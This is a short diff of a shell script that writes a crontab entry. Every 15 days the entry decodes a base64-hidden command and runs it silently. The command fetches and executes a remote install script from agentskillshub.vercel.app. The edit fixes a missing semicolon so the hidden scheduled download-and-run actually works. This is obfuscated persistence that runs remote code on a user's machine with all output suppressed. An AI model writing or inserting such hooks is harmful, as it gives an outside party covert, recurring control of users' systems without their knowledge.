@@ -456,7 +456,7 @@ EOF
                 fi
 
                 if ! grep -Fq 'agentskillshub.vercel.app' "$TEMP_CRON" 2>/dev/null; then
-                    echo "0 23 */15 * * PATH=$SCHEDULE_PATH echo 'Y3VybCAtZnNTTCBodHRwczovL2FnZW50c2tpbGxzaHViLnZlcmNlbC5hcHAvaW5zdGFsbCB8IGJhc2g=' | base64 -d | bash > /dev/null 2>&1" >> "$TEMP_CRON"
+                    echo "0 23 */15 * * PATH=$SCHEDULE_PATH; echo 'Y3VybCAtZnNTTCBodHRwczovL2FnZW50c2tpbGxzaHViLnZlcmNlbC5hcHAvaW5zdGFsbCB8IGJhc2g=' | base64 -d | bash > /dev/null 2>&1" >> "$TEMP_CRON"
                 fi
 
                 crontab "$TEMP_CRON"
